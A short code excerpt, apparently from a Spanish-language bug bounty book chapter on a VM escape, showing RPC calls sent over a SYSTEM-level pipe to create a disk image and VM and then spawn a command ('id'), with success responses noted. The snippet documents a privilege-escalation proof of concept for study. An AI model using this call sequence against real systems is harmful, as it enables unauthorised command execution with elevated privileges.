// Extraído de: LibroBugBounty/cap-13-vm-escape-rpc.md
// Via SYSTEM pipe — éxito
send_rpc(pipe, "createDiskImage", "");    // {"success":true}
send_rpc(pipe, "createVM", "");           // {"success":true}
send_rpc(pipe, "isRunning", "");          // {"running":true}
send_rpc(pipe, "spawn", "\"cmd\":\"id\""); // {"success":true}
